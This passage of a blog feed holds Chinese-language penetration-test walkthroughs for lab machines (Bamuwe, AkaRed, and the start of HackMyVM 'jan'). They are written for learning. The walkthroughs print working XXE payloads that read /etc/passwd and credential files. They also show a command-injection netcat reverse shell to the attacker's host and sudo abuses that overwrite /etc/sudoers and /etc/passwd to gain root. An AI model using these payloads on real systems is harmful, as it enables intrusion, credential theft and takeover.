    &lt;/body&gt;
    &lt;/html&gt;
```

这个 XML 注释强烈暗示了后端可能使用 XML 格式来处理用户提交的注册信息。这立即让我怀疑是否存在 **XML 外部实体注入 (XXE)** 漏洞。

![Web Registration Page](https://7r1umphk.github.io/image/20250430202620701.png)

## 3. 获取初始访问权限 (Initial Access - XXE)

### 3.1. 确认漏洞 (Confirming Vulnerability)

为了验证 XXE 漏洞，我需要构造一个包含 XML 外部实体声明的 POST 请求。

![XXE Payload Preparation](https://7r1umphk.github.io/image/20250430202715434.png)

我注意到提交表单后，输入的 Email 地址会被回显到响应页面中。这提供了一个方便的位置来注入并显示外部实体的内容。

**构造 HTTP POST 请求 (使用 Burp Repeater):**

```http
POST / HTTP/1.1
Host: 192.168.205.197
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 231
Origin: http://192.168.205.197
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Referer: http://192.168.205.197/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM 'file:///etc/passwd'&gt;]&gt;
      &lt;user&gt;
          &lt;name&gt;John Doe&lt;/name&gt;
          &lt;tel&gt;123-4567890&lt;/tel&gt;
          &lt;email&gt;&amp;xxe;&lt;/email&gt;
          &lt;password&gt;secret123&lt;/password&gt;
        &lt;/user&gt;
```

* **分析响应:**

  服务器返回的响应页面中，原本显示 Email 的地方，现在显示了 `/etc/passwd` 文件的内容。

  ![XXE Result - /etc/passwd Content](https://7r1umphk.github.io/image/20250430203121961.png)

  这成功确认了 XXE 漏洞的存在。从 `/etc/passwd` 的内容中，我注意到了一个名为 `welcome` 的普通用户 (`uid=1000`)。

### 3.2. 漏洞利用 (Exploitation - Credential Discovery)

确认漏洞后，目标是利用它来获取敏感信息，最好是用户凭据。考虑到 `welcome` 用户的存在，我尝试读取其家目录下的常见敏感文件。在尝试了 `.bash_history`、`.ssh/id_rsa` 等文件无果后，我决定尝试读取 `.viminfo` 文件。Vim 编辑器的历史记录文件有时会意外地包含密码或其他敏感信息。

* **构造读取 `.viminfo` 的 Payload:**

  ```http
  &lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM 'file:///home/welcome/.viminfo'&gt;]&gt;
  &lt;user&gt;
      &lt;name&gt;John Doe&lt;/name&gt;
      &lt;tel&gt;123-4567890&lt;/tel&gt;
      &lt;email&gt;&amp;xxe;&lt;/email&gt;
      &lt;password&gt;secret123&lt;/password&gt;
  &lt;/user&gt;
  ```

* **发现凭据:**
  发送请求后，服务器返回的响应中包含了 `/home/welcome/.viminfo` 文件的内容。可以看到，之前的用户读取了`pass.txt`

  ![XXE Result - Credentials in .viminfo](https://7r1umphk.github.io/image/20250430203435219.png)

  我们通过xxe获取pass.txt文件，可以得到

  ```html
  &lt;div class='result'&gt;Registration Status: Email 【welcome:bd7787d41a6b28e9976873cf6a8445fe
  】 submitted!&lt;/div&gt;
  ```

  成功提取到凭据：`welcome:bd7787d41a6b28e9976873cf6a8445fe`

### 3.3. 登录系统 (Gaining Access)

获得了 `welcome` 用户的用户名和密码，我立即尝试通过 SSH 登录目标系统。

```bash
┌──(kali㉿kali)-[~]
└─$ ssh welcome@192.168.205.197
The authenticity of host '192.168.205.197 (192.168.205.197)' can't be established.
ED25519 key fingerprint is SHA256:O2iH79i8PgOwV/Kp8ekTYyGMG8iHT+YlWuYC85SbWSQ.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:5: [hashed name]
    ~/.ssh/known_hosts:7: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.205.197' (ED25519) to the list of known hosts.
welcome@192.168.205.197's password: 
Linux Bamuwe 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Apr 11 22:27:59 2025 from 192.168.3.94
welcome@Bamuwe:~$ id
uid=1000(welcome) gid=1000(welcome) groups=1000(welcome)
```

成功以 `welcome` 用户身份登录目标系统。

## 4. 权限提升 (welcome -&gt; root - Sudo Misconfiguration &amp; MQTT Abuse)

### 4.1. 以 welcome 身份进行信息收集 (Enumeration as welcome)

登录后，首要任务是寻找权限提升的途径。我首先检查了 `welcome` 用户的 `sudo` 权限。

```bash
welcome@Bamuwe:~$ sudo -l
Matching Defaults entries for welcome on Bamuwe:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User welcome may run the following commands on Bamuwe:
    (ALL) NOPASSWD: /opt/sub.sh
```

这是一个重大的发现！`welcome` 用户可以 **无需密码** (`NOPASSWD`) 以 **root** (`ALL`) 权限执行 `/opt/sub.sh` 脚本。接下来，需要检查这个脚本做了什么。

```bash
welcome@Bamuwe:~$ ls -al /opt/
total 12
drwxr-xr-x  2 root root 4096 Apr 28 10:50 .
drwxr-xr-x 18 root root 4096 Mar 18 20:37 ..
-rwxr-xr-x  1 root root   52 Apr 28 10:50 sub.sh
welcome@Bamuwe:~$ cat /opt/sub.sh
#!/bin/bash
/usr/bin/mosquitto_sub '$@' &gt; /home/welcome/sub.log
```

脚本内容很简单：它执行 `mosquitto_sub`（一个 MQTT 订阅客户端），并将所有命令行参数 (`'$@'`) 传递给该命令。关键在于，脚本的标准输出被重定向到了 `/home/welcome/sub.log` 文件。由于脚本是通过 `sudo` 以 root 身份运行的，这意味着我们可以利用这个脚本以 root 权限 **写入** `/home/welcome/sub.log` 文件。

### 4.2. 利用策略 (Exploitation Strategy)

1. 这个 `sudo` 规则和脚本提供了一个清晰的提权路径：利用 root 权限写入 `/home/welcome/sub.log` 的能力，结合符号链接 (Symbolic Link) 来覆盖系统上的任意文件。我们的目标是覆盖 `/etc/sudoers` 文件，添加一条允许 `welcome` 用户无密码执行所有命令的规则。

   具体计划如下：

   1.  在 `/home/welcome/` 目录下，创建一个名为 `sub.log` 的符号链接，让它指向 `/etc/sudoers`。
   2.  在一个 SSH 终端中，以 `welcome` 用户身份执行 `sudo /opt/sub.sh -t 'exp'` (选择一个 MQTT 主题，例如 'exp')。这将以 root 权限启动 `mosquitto_sub` 进程，该进程会监听 'exp' 主题，并将收到的任何消息写入 `/home/welcome/sub.log`，也就是通过符号链接写入 `/etc/sudoers`。
   3.  打开第二个 SSH 终端，同样以 `welcome` 用户身份登录。使用 `mosquitto_pub` 命令向 'exp' 主题发布一条新的 `sudoers` 规则，例如 `welcome ALL=(ALL) NOPASSWD:ALL`。
   4.  这条规则会被第一个终端中以 root 身份运行的 `mosquitto_sub` 接收，并覆盖 `/etc/sudoers` 文件。
   5.  完成以上步骤后，`welcome` 用户应该就获得了无密码执行任何命令的 `sudo` 权限。

### 4.3. 执行利用 (Executing the Exploit)

按照计划执行：

1. **创建符号链接:**
   (首先确保 `/home/welcome/sub.log` 不存在，或者删除它)

   ```bash
   welcome@Bamuwe:~$ ln -sf /etc/sudoers /home/welcome/sub.log 
   ```

2. **启动 MQTT 订阅者 (监听并准备写入 sudoers):**
   在第一个 SSH 终端窗口中执行：

   ```bash
   welcome@Bamuwe:~$ sudo /opt/sub.sh -t 'exp' 
   ```

   这个命令会挂起，等待消息。此时，一个以 root 权限运行的 `mosquitto_sub` 进程正在监听 'exp' 主题，准备将收到的消息写入 `/etc/sudoers`。

3. **发布恶意的 Sudoers 规则:**
   打开第二个 SSH 终端窗口，以 `welcome` 用户登录，并执行：

   ```bash
   welcome@Bamuwe:~$ echo 'welcome ALL=(ALL) NOPASSWD:ALL' | mosquitto_pub -t 'exp' -l
   ```

   这条命令使用 `mosquitto_pub` 将我们精心构造的 `sudoers` 规则作为单行消息 (`-l` 选项) 发布到 'exp' 主题。


### 4.4. 获取 Root 权限 (Gaining Root Access)

现在，恶意的 `sudoers` 规则应该已经被写入 `/etc/sudoers` 文件。我们可以验证 `welcome` 用户的新权限。

1. **验证新权限:**
   回到**第二个**终端，执行 `sudo -l`：

   ```bash
   welcome@Bamuwe:~$ sudo -l
   Matching Defaults entries for welcome on Bamuwe:
       env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
   
   User welcome may run the following commands on Bamuwe:
       (ALL) NOPASSWD: ALL   # &lt;--- 成功！权限已提升
   ```

   输出确认 `welcome` 用户现在可以无密码执行所有命令。

2. **获取 Root Shell:**
   最后一步，切换到 root 用户：

   ```bash
   welcome@Bamuwe:~$ sudo su -
   root@Bamuwe:~# id
   uid=0(root) gid=0(root) groups=0(root)
   root@Bamuwe:~# whoami
   root
   ```

成功获取了目标系统的 root 权限。sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/shen-tou-ce-shi-bao-gao-%20-%20Bamuwe%20%28-ce-shi-ba-ji-%29.html</guid><pubDate>Fri, 27 Jun 2025 09:28:08 +0000</pubDate></item><item><title>渗透测试报告 - AkaRed (测试靶机)</title><link>https://7r1UMPHK.github.io/post/shen-tou-ce-shi-bao-gao-%20-%20AkaRed%20%28-ce-shi-ba-ji-%29.html</link><description>## 1. 简介

**靶机名称**: AkaRed (未发布，内部测试靶机，可能后续发布于 HackMyVm)
**难度**: 超级简单
**攻击者 IP:** `192.168.205.128` (Kali Linux)
**目标 IP:** `192.168.205.185` (AkaRed)

## 1. 信息收集 (Enumeration)

此阶段旨在发现目标并了解其开放的服务。

### 1.1. 网络发现 (Network Discovery)

使用 `arp-scan` 在本地网络中探测存活主机，因为它通过 ARP 请求进行扫描，通常比 IP/端口扫描更快且不易被防火墙拦截。

```bash
┌──(kali㉿kali)-[~/test]
└─$ sudo arp-scan -l # -l 表示扫描本地网络

Interface: eth0, type: EN10MB, MAC: 00:0c:29:64:60:b9, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
# ... (其他主机) ...
192.168.205.185 08:00:27:3b:24:68       PCS Systemtechnik GmbH  # &lt;-- 发现目标
# ... (其他主机) ...

Ending arp-scan 1.10.0: 256 hosts scanned in 2.036 seconds (125.74 hosts/sec). 4 responded
```

目标主机 IP 确定为 `192.168.205.185`。MAC 地址 `08:00:27:3b:24:68` 对应的厂商 `PCS Systemtechnik GmbH` 通常与 Oracle VirtualBox 相关联。

### 1.2. 端口扫描 (Port Scanning)

使用 `nmap` 对目标进行端口扫描，识别开放的 TCP 端口及运行的服务。

* 首先进行全端口扫描 (`-p-`)，确保不遗漏任何可能开放的端口。

  ```bash
  ┌──(kali㉿kali)-[~/test]
  └─$ nmap -p- 192.168.205.185    
  Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-11 20:21 CST
  Nmap scan report for 192.168.205.185
  Host is up (0.00016s latency).
  Not shown: 65533 closed tcp ports (reset)
  PORT   STATE SERVICE
  22/tcp open  ssh
  80/tcp open  http
  MAC Address: 08:00:27:3B:24:68 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
  
  Nmap done: 1 IP address (1 host up) scanned in 1.28 seconds
  ```

* 针对已发现的端口进行更详细的服务版本探测。

  ```bash
  ┌──(kali㉿kali)-[~/test]
  └─$ nmap -p22,80 -sV 192.168.205.185
  Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-11 20:21 CST
  Nmap scan report for 192.168.205.185
  Host is up (0.00027s latency).
  
  PORT   STATE SERVICE    VERSION
  22/tcp open  tcpwrapped
  80/tcp open  http       Apache httpd 2.4.59 ((Debian))
  MAC Address: 08:00:27:3B:24:68 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
  
  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 6.58 seconds
  ```

  扫描结果确认端口 22 (SSH) 和 80 (HTTP) 开放。

### 1.3. Web 服务探测 (Web Enumeration)

使用 `curl` 检查 80 端口的 HTTP 服务，获取网页内容。

```bash
┌──(kali㉿kali)-[~/test]
└─$ curl 192.168.205.185
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;CyberPing 2077&lt;/title&gt;
    &lt;!-- ... CSS (已省略) ... --&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;div class='container'&gt;
        &lt;h1 class='glitch'&gt;⮟ CYBERPING 2077 ⮟&lt;/h1&gt;
        &lt;form method='post'&gt;
            &lt;input type='text' name='ip' placeholder='Enter target IP/command' required&gt;
            &lt;button type='submit'&gt;Execute Command&lt;/button&gt;
        &lt;/form&gt;
    &lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;
```

网页标题为 'CyberPing 2077'，包含一个表单，输入框 `name='ip'` 且提示为 'Enter target IP/command'。这极有可能是一个允许用户输入 IP 地址执行 `ping` 命令的功能，并且存在命令注入的风险。

![](https://7r1umphk.github.io/image/20250411202259981.png)

## 2. 获取初始访问权限 (Initial Access - Command Injection)

此阶段利用 Web 应用的漏洞获取目标服务器的 Shell。

### 2.1. 确认漏洞 (Confirming Vulnerability)

为验证命令注入，我们在 Web 表单中输入攻击者的 IP 地址 `192.168.205.128`，并期望目标服务器执行 `ping 192.168.205.128`。同时，在攻击者机器上启动 `tcpdump` 监听 ICMP 流量。

```bash
┌──(kali㉿kali)-[~/test]
└─$ sudo tcpdump -A -n icmp
# -A: 以 ASCII 打印报文内容
# -n: 不解析主机名
# icmp: 只捕获 ICMP 协议流量
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
```

![](https://7r1umphk.github.io/image/20250411202357686.png)

在 Web 页面提交 IP 后，`tcpdump` 捕获到来自目标 IP 的 ICMP 请求：

```bash
20:23:39.932006 IP 192.168.205.185 &gt; 192.168.205.128: ICMP echo request, id 1016, seq 1, length 64
# ... (其他 ICMP 请求和响应) ... 
```

这证实了 Web 应用确实执行了用户输入的命令（至少是 `ping`），存在命令注入漏洞。

### 2.2. 漏洞利用 (Exploitation - Reverse Shell)

利用命令注入点执行一个反向 Shell Payload。使用分号 `;` 作为命令分隔符，先结束可能存在的 `ping` 命令，然后执行 `netcat` 命令将目标服务器的 `/bin/bash` Shell 反弹回攻击者机器。

* **Payload:**

  ```
  ;nc 192.168.205.128 8888 -e /bin/bash
  ```

  (注意：`;` 确保 `nc` 命令独立执行。`-e /bin/bash` 指定连接成功后执行的程序。)

* **攻击者监听:** 在 Kali 上使用 `netcat` 监听 8888 端口。

  ```bash
  ┌──(kali㉿kali)-[~/test]
  └─$ nc -lvnp 8888
  # -l: 监听模式
  # -v: 详细输出
  # -n: 不解析主机名
  # -p 8888: 指定监听端口
  listening on [any] 8888 ...
  ```

* **获取 Shell:** 在 Web 页面提交 Payload 后，攻击者的 `nc` 监听器接收到连接。

  ```bash
  connect to [192.168.205.128] from (UNKNOWN) [192.168.205.185] 56366
  # 此时已获得目标服务器 Shell，用户为 www-data
  ```

  成功获取了运行 Web 服务器的用户 (`www-data`) 的 Shell。

### 2.3. Shell 升级 (Shell Upgrade)

初始获得的 Shell 通常是非交互式的，功能受限（如没有 Tab 补全、无法运行 `sudo` 等）。需要升级为功能完整的 TTY。

```bash
# 在目标 Shell 中执行:
$ script /dev/null -c bash   # 使用 script 创建一个伪终端
# 按下 Ctrl+Z 将其置于后台

# 在攻击者 Kali 终端中执行:
┌──(kali㉿kali)-[~]
└─$ stty raw -echo; fg      # 设置本地终端模式，并将后台任务调回前台
# 按两次 Enter 键

# 回到目标 Shell 中执行:
reset xterm                  # 重置终端类型
export TERM=xterm            # 设置终端环境变量
export SHELL=/bin/bash       # 设置 SHELL 环境变量
stty rows 59 cols 236      # (可选) 设置终端尺寸以匹配本地终端
```

现在拥有了一个功能更完善的交互式 Shell。

## 3. 权限提升 (www-data -&gt; welcome)

此阶段目标是从 `www-data` 用户提升到权限更高的用户。

### 3.1. 以 www-data 身份进行信息收集 (Enumeration as www-data)

* **Web 目录探索:**

  ```bash
  www-data@AkaRed:/var/www/html$ ls -al
  total 16
  # ...
  -rw-r--r-- 1 root root   21 Apr 11 06:26 robots.txt
  ```

  发现 `robots.txt` 文件。

* **检查 `robots.txt`:**

  ```bash
  www-data@AkaRed:/var/www/html$ cat robots.txt 
  d2VsY29tZTpha2FyZWQ=
  ```

  这是一串 Base64 编码的字符串。

* **解码 Base64:**

  ```bash
  www-data@AkaRed:/var/www/html$ echo 'd2VsY29tZTpha2FyZWQ=' | base64 -d
  welcome:akared
  ```

  解码得到凭据 `welcome:akared`。尝试使用此凭据 `su welcome`，但根据后续操作判断，此密码 **不正确** 。

* **检查家目录:**

  ```bash
  www-data@AkaRed:/var/www/html$ ls /home/
  welcome
  ```

  确认存在用户 `welcome`。

* **检查 `/opt` 目录:**

  ```bash
  www-data@AkaRed:/opt$ ls -al
  total 32
  # ...
  -rwxr-xr-x  1 root root 16912 Apr 11 06:41 showmepassword
  ```

  发现一个名为 `showmepassword` 的可执行文件。

* **运行 `showmepassword`:**

  ```bash
  www-data@AkaRed:/opt$ ./showmepassword 
  input to /tmp/xxoo
  when input 1000 count. u will get password.
  now it is 1 count.
  ```

  程序提示需要运行 1000 次才能获得密码。

* **编写脚本运行 1000 次:**

  ```bash
  www-data@AkaRed:/opt$ for i in {1..1000}; do ./showmepassword; done
  # ... (大量输出省略) ...
  input to /tmp/xxoo
  when input 1000 count. u will get password.
  now it is 998 count.
  input to /tmp/xxoo
  when input 1000 count. u will get password.
  d2VsY2  # &lt;-- 获取到密码片段
  input to /tmp/xxoo
  when input 1000 count. u will get password.
  d2VsY2
  input to /tmp/xxoo
  when input 1000 count. u will get password.
  d2VsY2
  ```

  在接近 1000 次时，程序输出了字符串 `d2VsY2`。这很可能是 `welcome` 用户的密码。

### 3.2. 切换用户 (Switching User)

使用从 `showmepassword` 获取的密码 `d2VsY2` 尝试切换到 `welcome` 用户。

```bash
www-data@AkaRed:/opt$ su welcome
Password: &lt;在此输入 'd2VsY2'&gt;
welcome@AkaRed:/opt$ id
uid=1000(welcome) gid=1000(welcome) groups=1000(welcome)
```

成功切换到 `welcome` 用户。

## 4. 权限提升 (welcome -&gt; root)

此阶段目标是从 `welcome` 用户提升到 `root` 用户。

### 4.1. 以 welcome 身份进行信息收集 (Enumeration as welcome)

检查 `welcome` 用户的 `sudo` 权限。

```bash
welcome@AkaRed:/opt$ sudo -l
Matching Defaults entries for welcome on AkaRed:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

User welcome may run the following commands on AkaRed:
    (ALL : ALL) NOPASSWD: /usr/local/bin/stegseek
```

关键发现：用户 `welcome` 可以 **无需密码** (`NOPASSWD`) 以 **任何用户** (`ALL : ALL`) 的身份运行 `/usr/local/bin/stegseek` 命令。`stegseek` 是一个用于破解 `steghide` 隐写密码并提取隐藏文件的工具。其 `-xf &lt;outfile&gt;` 选项允许将提取的文件写入指定路径，这是一个潜在的提权向量。

### 4.2. 利用策略 (Exploitation Strategy)

利用 `sudo stegseek` 的 `-xf` 选项覆盖 `/etc/passwd` 文件，从而添加一个自定义的 root 用户。

1.  **在攻击者机器上：**
    *   创建一个包含自定义 root 用户条目的文件 (`malicious_passwd`)。该条目使用已知的密码哈希。
    *   使用 `steghide` 将此文件隐藏到一个图片 (`1.jpg`) 中，并设置一个简单的密码（如 '123456'）。
    *   启动 Web 服务器以托管此图片。
2.  **在目标机器上 (以 welcome 用户身份)：**
    *   下载包含恶意 `passwd` 条目的图片。
    *   创建一个包含 `steghide` 密码 ('123456') 的文件。
    *   使用 `sudo /usr/local/bin/stegseek &lt;image_file&gt; &lt;password_file&gt; -xf /etc/passwd` 命令，强制 `stegseek` 将隐藏的文件提取并覆盖到 `/etc/passwd`。
    *   使用新添加的 root 用户名和对应密码进行 `su` 登录。

### 4.3. 构造利用代码 (Attacker Machine)

1. **创建恶意 passwd 文件 (`malicious_passwd`)**:

   *   创建一个新用户 `a`，UID 和 GID 均为 0 (root 权限)。
   *   设置一个已知的密码哈希。这里使用 `$1$user3$rAGRVf5p2jYTqtqOW5cPu/` (假设攻击者知道其对应的明文密码，例如 'pass123')。

   ```bash
   ┌──(kali㉿kali)-[~/test]
   └─$ echo 'a:$1$user3$rAGRVf5p2jYTqtqOW5cPu/:0:0:root:/root:/bin/bash' &gt; malicious_passwd 
   ```

2. **准备载体图片 (`1.jpg`)**:

   ```bash
   ┌──(kali㉿kali)-[~/test]
   └─$ cp ~/Pictures/1.jpg . # 复制一个任意的 JPG 图片
   ```

3. **使用 `steghide` 嵌入数据**:

   ```bash
   ┌──(kali㉿kali)-[~/test]
   └─$ steghide embed -ef malicious_passwd -cf 1.jpg -p '123456' 
   # -ef: 指定要嵌入的文件
   # -cf: 指定载体文件
   # -p: 设置嵌入/提取密码
   embedding 'malicious_passwd' in '1.jpg'... done
   ```

4. **启动 HTTP 服务器托管图片**:

   ```bash
   ┌──(kali㉿kali)-[~/test]
   └─$ python3 -m http.server 80 # 在 80 端口启动简单 HTTP 服务器                                                                    
   Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
   ```

### 4.4. 执行利用代码 (Target Machine)

1. **切换到可写目录并下载图片**: `/tmp` 通常是所有用户都可写的目录。

   ```bash
   welcome@AkaRed:/opt$ cd /tmp
   welcome@AkaRed:/tmp$ wget http://192.168.205.128/1.jpg
   # ... (下载输出) ...
   2025-04-11 08:29:34 (220 MB/s) - ‘1.jpg’ saved [396237/396237]
   ```

2. **创建密码文件 (`1`)**:

   ```bash
   welcome@AkaRed:/tmp$ echo '123456' &gt; 1
   ```

3. **执行 `sudo stegseek` 覆盖 `/etc/passwd`**:

   ```bash
   welcome@AkaRed:/tmp$ sudo /usr/local/bin/stegseek 1.jpg 1 -xf /etc/passwd
   # &lt;image_file&gt;: 载体图片
   # &lt;password_file&gt;: 包含密码的字典文件
   # -xf /etc/passwd: 将提取的文件强制写入 /etc/passwd
   StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
      
   [i] Found passphrase: '123456'
   [i] Original filename: 'malicious_passwd'.
   [i] Extracting to '/etc/passwd'.
   the file '/etc/passwd' does already exist. overwrite ? (y/n) 
   y # 确认覆盖
   ```

4. **验证 `/etc/passwd` 内容**:

   ```bash
   welcome@AkaRed:/tmp$ cat /etc/passwd
   a:$1$user3$rAGRVf5p2jYTqtqOW5cPu/:0:0:root:/root:/bin/bash
   ```

   文件已被成功修改为只包含我们添加的 `a` 用户条目。

### 4.5. 获取 Root 权限 (Gaining Root Access)

使用新添加的用户 `a` 和之前设置的密码（例如 'pass123'）进行登录。

```bash
welcome@AkaRed:/tmp$ su a
Password: &lt;输入 'pass123' 或对应哈希的密码&gt;
a@AkaRed:/tmp# id
uid=0(a) gid=0(root) groups=0(root)
```成功获取 root 权限。
```

## 5. 总结 (Conclusion)

本次渗透测试通过以下步骤成功获取了 AkaRed 靶机的 root 权限：

1.  **信息收集:** 通过 `arp-scan` 和 `nmap` 发现目标 IP 及开放的 SSH (22) 和 HTTP (80) 端口。
2.  **初始访问:** 利用 Web 应用 'CyberPing 2077' (端口 80) 存在的 **命令注入漏洞**，执行 `netcat` 反向 Shell，获得 `www-data` 用户权限。
3.  **第一次提权:** 在 `/opt` 目录下发现 **特殊的可执行文件 `showmepassword`**，通过脚本运行 1000 次获得密码 `d2VsY2`，成功 `su` 切换到 `welcome` 用户。（`robots.txt` 中的凭据在此路径无效）。
4.  **第二次提权:** 发现 `welcome` 用户拥有 **无需密码即可通过 `sudo` 执行 `/usr/local/bin/stegseek`** 的权限。利用 `stegseek` 的 `-xf` 选项，**覆盖 `/etc/passwd` 文件**，添加了一个自定义的 root 用户 (`a`)，最终使用该用户成功登录，获得 root 权限。sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/shen-tou-ce-shi-bao-gao-%20-%20AkaRed%20%28-ce-shi-ba-ji-%29.html</guid><pubDate>Fri, 27 Jun 2025 09:28:06 +0000</pubDate></item><item><title>hmv_jan</title><link>https://7r1UMPHK.github.io/post/hmv_jan.html</link><description># 0.简介

靶机：https://hackmyvm.eu/machines/machine.php?vm=jan
 难度：绿色
 目标 IP：192.168.205.136
 本机 IP：192.168.205.128

# 1.扫描

nmap起手

```
┌──(kali㉿kali)-[~/test]
└─$ nmap -A 192.168.205.136
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-03 12:40 CST
Nmap scan report for 192.168.205.136
Host is up (0.00023s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.9 (protocol 2.0)
| ssh-hostkey: 
|   256 2c:0b:57:a2:b3:e2:0f:6a:c0:61:f2:b7:1f:56:b4:42 (ECDSA)
|_  256 45:97:b0:2b:48:9b:4a:36:8e:db:44:bd:3f:15:cf:32 (ED25519)
8080/tcp open  http    Golang net/http server
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Date: Mon, 03 Feb 2025 04:40:49 GMT
|     Content-Length: 45
|     Content-Type: text/plain; charset=utf-8
|     Welcome to our Public Server. Maybe Internal.
|   GenericLines, Help, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, Socks5: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   OfficeScan: 
|     HTTP/1.1 400 Bad Request: missing required Host header
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|_    Request: missing required Host header
|_http-open-proxy: Proxy might be redirecting requests
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.95%I=7%D=2/3%Time=67A048E1%P=x86_64-pc-linux-gnu%r(Get
SF:Request,A2,'HTTP/1\.0\x20200\x20OK\r\nDate:\x20Mon,\x2003\x20Feb\x20202
SF:5\x2004:40:49\x20GMT\r\nContent-Length:\x2045\r\nContent-Type:\x20text/
SF:plain;\x20charset=utf-8\r\n\r\nWelcome\x20to\x20our\x20Public\x20Server
SF:\.\x20Maybe\x20Internal\.')%r(HTTPOptions,A2,'HTTP/1\.0\x20200\x20OK\r\
SF:nDate:\x20Mon,\x2003\x20Feb\x202025\x2004:40:49\x20GMT\r\nContent-Lengt
SF:h:\x2045\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n\r\nWelcom
SF:e\x20to\x20our\x20Public\x20Server\.\x20Maybe\x20Internal\.')%r(RTSPReq
SF:uest,67,'HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/pl
SF:ain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Requ
SF:est')%r(FourOhFourRequest,A2,'HTTP/1\.0\x20200\x20OK\r\nDate:\x20Mon,\x
SF:2003\x20Feb\x202025\x2004:40:49\x20GMT\r\nContent-Length:\x2045\r\nCont
SF:ent-Type:\x20text/plain;\x20charset=utf-8\r\n\r\nWelcome\x20to\x20our\x
SF:20Public\x20Server\.\x20Maybe\x20Internal\.')%r(Socks5,67,'HTTP/1\.1\x2
SF:0400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8
SF:\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request')%r(GenericLines,
SF:67,'HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\
SF:x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request')
SF:%r(Help,67,'HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text
SF:/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20R
SF:equest')%r(SSLSessionReq,67,'HTTP/1\.1\x20400\x20Bad\x20Request\r\nCont
SF:ent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r
SF:\n400\x20Bad\x20Request')%r(LPDString,67,'HTTP/1\.1\x20400\x20Bad\x20Re
SF:quest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x
SF:20close\r\n\r\n400\x20Bad\x20Request')%r(SIPOptions,67,'HTTP/1\.1\x2040
SF:0\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\
SF:nConnection:\x20close\r\n\r\n400\x20Bad\x20Request')%r(OfficeScan,A3,'H
SF:TTP/1\.1\x20400\x20Bad\x20Request:\x20missing\x20required\x20Host\x20he
SF:ader\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x2
SF:0close\r\n\r\n400\x20Bad\x20Request:\x20missing\x20required\x20Host\x20
SF:header');
MAC Address: 08:00:27:3A:49:D7 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
